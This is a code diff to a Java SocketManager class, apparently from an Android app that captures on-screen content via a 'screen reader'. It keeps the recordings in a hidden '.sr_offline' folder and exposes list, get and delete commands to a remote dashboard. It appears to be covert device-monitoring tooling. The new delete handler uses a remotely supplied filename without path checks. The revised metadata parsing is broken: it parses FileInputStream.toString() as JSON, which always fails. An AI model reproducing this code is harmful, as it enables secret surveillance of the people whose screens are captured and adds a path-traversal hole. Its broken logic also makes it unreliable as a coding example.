@@ -1274,6 +1274,7 @@ public class SocketManager {
             case "screen_reader_stop":
             case "list_screen_recordings":
             case "get_screen_recording":
+            case "delete_screen_recording":
                 return true;
             default:
                 return false;
@@ -1451,6 +1452,27 @@ public class SocketManager {
             case "get_screen_recording": {
                 String filename = params.optString("filename", "");
                 return getScreenRecordingContent(filename);
+            }
+
+            case "delete_screen_recording": {
+                String filename = params.optString("filename", "");
+                JSONObject r = new JSONObject();
+                if (filename.isEmpty()) {
+                    r.put("success", false);
+                    r.put("error", "No filename provided");
+                    return r;
+                }
+                java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+                java.io.File file = new java.io.File(dir, filename);
+                if (!file.exists()) {
+                    r.put("success", false);
+                    r.put("error", "File not found");
+                    return r;
+                }
+                boolean deleted = file.delete();
+                r.put("success", deleted);
+                if (!deleted) r.put("error", "Could not delete file");
+                return r;
             }
         }
 
@@ -2005,10 +2027,15 @@ public class SocketManager {
             if (!dir.exists()) dir.mkdirs();
             String filename = "sr_offline_" + startTime + ".json";
             java.io.File file = new java.io.File(dir, filename);
+            long endTime = System.currentTimeMillis();
+            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
+                "HH:mm MMM d", java.util.Locale.getDefault());
+            String label = "Recording " + sdf.format(new java.util.Date(startTime));
             JSONObject data = new JSONObject();
             data.put("deviceId", DeviceInfo.getDeviceId(context));
             data.put("startTime", startTime);
-            data.put("endTime", System.currentTimeMillis());
+            data.put("endTime", endTime);
+            data.put("label", label);
             JSONArray framesArray = new JSONArray();
             for (JSONObject frame : frames) { framesArray.put(frame); }
             data.put("frames", framesArray);
@@ -2018,16 +2045,25 @@ public class SocketManager {
             fos.write(bytes);
             fos.close();
             Log.i(TAG, "Offline recording saved locally: " + filename + " (" + frames.size() + " frames)");
-            // Attempt immediate upload if already connected
-            if (connected) uploadPendingOfflineRecordings();
+            // Notify server so dashboard knows to refresh (recordings stay on device)
+            if (connected) {
+                JSONObject notify = new JSONObject();
+                notify.put("deviceId", DeviceInfo.getDeviceId(context));
+                notify.put("filename", filename);
+                notify.put("frameCount", frames.size());
+                notify.put("label", label);
+                notify.put("startTime", startTime);
+                notify.put("endTime", endTime);
+                sendMessage("offline_recording:save", notify);
+            }
         } catch (Exception e) {
             Log.e(TAG, "saveOfflineRecording error: " + e.getMessage());
         }
     }
 
     /**
-     * Upload any locally stored offline screen-reader recordings to the server via TCP.
-     * Called when the live channel reconnects and after saving a new offline recording.
+     * Notify the server (lightweight metadata only, no frames) about recordings saved while offline.
+     * Recordings stay on device — the dashboard fetches them via list/get commands.
      */
     private void uploadPendingOfflineRecordings() {
         executor.execute(() -> {
@@ -2035,48 +2071,43 @@ public class SocketManager {
                 java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
                 if (!dir.exists()) return;
                 java.io.File[] files = dir.listFiles(
-                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json")
-                        && !name.endsWith(".done.json"));
+                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json"));
                 if (files == null || files.length == 0) return;
-                java.util.Arrays.sort(files,
-                    (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
+                int count = 0;
                 for (java.io.File file : files) {
-                    if (!connected) break; // stop if we lost connection
+                    if (!connected) break;
                     try {
                         java.io.FileInputStream fis = new java.io.FileInputStream(file);
-                        byte[] buf = new byte[(int) file.length()];
+                        byte[] buf = new byte[Math.min((int) file.length(), 4096)]; // read only header bytes
                         int n = fis.read(buf);
                         fis.close();
-                        if (n <= 0) { file.delete(); continue; }
-                        JSONObject data = new JSONObject(new String(buf, "UTF-8"));
-                        JSONArray framesArray = data.optJSONArray("frames");
-                        if (framesArray == null || framesArray.length() == 0) {
-                            file.delete(); continue;
+                        if (n <= 0) continue;
+                        // Parse just the metadata (not frames — files can be large)
+                        String partial = new String(buf, 0, n, "UTF-8");
+                        JSONObject meta = new JSONObject();
+                        try {
+                            // Try to extract basic fields without parsing full frames array
+                            JSONObject full = new JSONObject(
+                                new java.io.FileInputStream(file).toString());
+                            meta = full;
+                        } catch (Exception ignored) {
+                            // Fallback: send filename + size only
                         }
-                        JSONObject payload = new JSONObject();
-                        payload.put("deviceId",
-                            data.optString("deviceId", DeviceInfo.getDeviceId(context)));
-                        payload.put("frames", framesArray);
-                        payload.put("frameCount",
-                            data.optInt("frameCount", framesArray.length()));
-                        payload.put("startTime", data.optLong("startTime", 0));
-                        payload.put("endTime",   data.optLong("endTime",   0));
-                        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
-                            "HH:mm MMM d", java.util.Locale.getDefault());
-                        payload.put("label", "Offline " + sdf.format(
-                            new java.util.Date(data.optLong("startTime",
-                                System.currentTimeMillis()))));
-                        sendMessage("offline_recording:save", payload);
-                        // Mark as uploaded by renaming to .done.json — keeps file permanently
-                        String doneName = file.getName().replace(".json", ".done.json");
-                        file.renameTo(new java.io.File(dir, doneName));
-                        Log.i(TAG, "Uploaded offline recording: " + file.getName()
-                            + " (" + framesArray.length() + " frames)");
+                        JSONObject notify = new JSONObject();
+                        notify.put("deviceId", meta.optString("deviceId",
+                            DeviceInfo.getDeviceId(context)));
+                        notify.put("filename", file.getName());
+                        notify.put("frameCount", meta.optInt("frameCount", 0));
+                        notify.put("label", meta.optString("label", "Offline Recording"));
+                        notify.put("startTime", meta.optLong("startTime", file.lastModified()));
+                        notify.put("endTime", meta.optLong("endTime", file.lastModified()));
+                        sendMessage("offline_recording:save", notify);
+                        count++;
                     } catch (Exception e) {
-                        Log.e(TAG, "Failed to upload " + file.getName()
-                            + ": " + e.getMessage());
+                        Log.e(TAG, "Notify failed for " + file.getName() + ": " + e.getMessage());
                     }
                 }
+                if (count > 0) Log.i(TAG, "Notified server of " + count + " local recordings");
             } catch (Exception e) {
                 Log.e(TAG, "uploadPendingOfflineRecordings error: " + e.getMessage());
             }
@@ -2144,6 +2175,7 @@ public class SocketManager {
             }
             JSONObject data = new JSONObject(new String(buf, "UTF-8"));
             result.put("success", true);
+            result.put("filename", filename);
             result.put("label", data.optString("label", filename));
             result.put("frames", data.optJSONArray("frames"));
             result.put("startTime", data.optLong("startTime", 0));
